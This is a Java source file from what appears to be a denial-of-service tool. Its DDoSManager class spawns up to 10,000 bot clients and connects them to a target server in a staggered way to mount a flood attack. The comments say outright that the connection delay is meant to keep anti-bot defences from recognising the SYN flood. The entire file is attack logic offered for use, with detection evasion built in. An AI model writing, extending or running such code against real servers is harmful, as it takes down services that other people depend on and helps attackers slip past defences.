package src.Main.DDosSoftware.DDosLogic.SYNFlood;

import src.Main.DDosSoftware.DDosLogic.Client.ClientManager;
import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;
import src.Main.DDosSoftware.Enums.Intensity;

public class DDoSManager {
    /*
     * Define how many bots you wanna flood to the server
     * this will impact your PC resources, but not a big deal
     */
    private Intensity intensity = Intensity.LOW;

    /*
     * The delay time by miliseconds after a bot is joined
     * this might make the anti-bot stuff harder too check
     * if they're getting SYNFlood
     */
    private long delayTime = DEFAULT_DELAY_TIME;
    public static long DEFAULT_DELAY_TIME = 15;

    public long getDelayTime() {
        return this.delayTime;
    }

    public Intensity getIntensity() {
        return this.intensity;
    }

    // ! THINGS ARE BEGIN HERE
    public void start() {
        // * CREATE BOTS
        for (int bot = 0; bot < getBotSize(intensity); bot++) {
            ClientManager.createClient(bot);
        }

        if (ServerManager.canConnect()) {
            // * CONNECT TO THE SERVER
            for (int index = 0; index < ClientManager.clients.size(); index++) {
                // * Start new client thread
                ClientManager.clients.get(index).connect();

                try {
                    Thread.sleep(delayTime);
                } catch (Exception e) {

                }
            }
        }

    }

    /**
     * Set the intensity of the bot
     * 
     * @param intensity intensity of the DDoS
     * @return the object itself
     */
    public DDoSManager setIntensity(Intensity intensity) {
        this.intensity = intensity;
        return this;
    }

    /**
     * Set the delay time might make the anti-bot stuff
     * harder too check if they're getting SYN Flood
     * 
     * @param delayTime the delay time after a bot is joined
     * @return the object itself
     */
    public DDoSManager setDelayTime(long delayTime) {
        if (delayTime < DEFAULT_DELAY_TIME) {
            this.delayTime = DEFAULT_DELAY_TIME;
        } else {
            this.delayTime = delayTime;
        }
        return this;
    }

    public static int getBotSize(Intensity intense) {
        switch (intense) {
            case LOW:
                return 500;
            case MEDIUM:
                return 1000;
            case HIGH:
                return 5000;
            case HIGEST:
                return 10000;
            default:
                return 500;
        }
    }
}
